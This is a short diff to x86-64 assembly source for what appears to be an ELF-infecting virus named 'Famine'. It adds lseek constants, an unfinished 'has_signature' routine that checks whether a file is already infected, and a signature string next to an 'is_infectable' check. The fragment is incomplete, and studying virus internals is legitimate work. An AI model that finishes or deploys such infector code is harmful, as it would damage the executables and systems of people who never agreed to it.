@@ -4,6 +4,7 @@ SYS_READ:       equ 0
 SYS_WRITE:      equ 1
 SYS_OPEN:       equ 2
 SYS_CLOSE:      equ 3
+SYS_LSEEK:      equ 8
 SYS_MPROTECT:   equ 10
 SYS_EXIT:       equ 60
 
@@ -16,6 +17,11 @@ O_RDWR:     equ 2
 PROT_READ:  equ 0x01
 PROT_WRITE: equ 0x02
 PROT_EXEC:  equ 0x04
+
+; lseek flags
+SEEK_SET:   equ 0
+SEEK_CUR:   equ 1
+SEEK_END:   equ 2
 
 ; ELF
 ; e_ident
@@ -133,6 +139,15 @@ is_infectable:
             loop check_padding
         ; check_padding
     ; elf64_ident_check
+
+    ; in: fd (r8)
+    ; out: ?
+    has_signature:
+        mov rax, SYS_LSEEK
+        mov rdi, r8
+        mov rsi, SEEK_END
+    ; has_signature
+
     add sp, 16
     ret
 ; is_infectable
@@ -246,3 +261,5 @@ not_elf_msg:
     db "Not an ELF", 10
 file_path:
     db "Famine", 0
+signature:
+    db "signature", 0
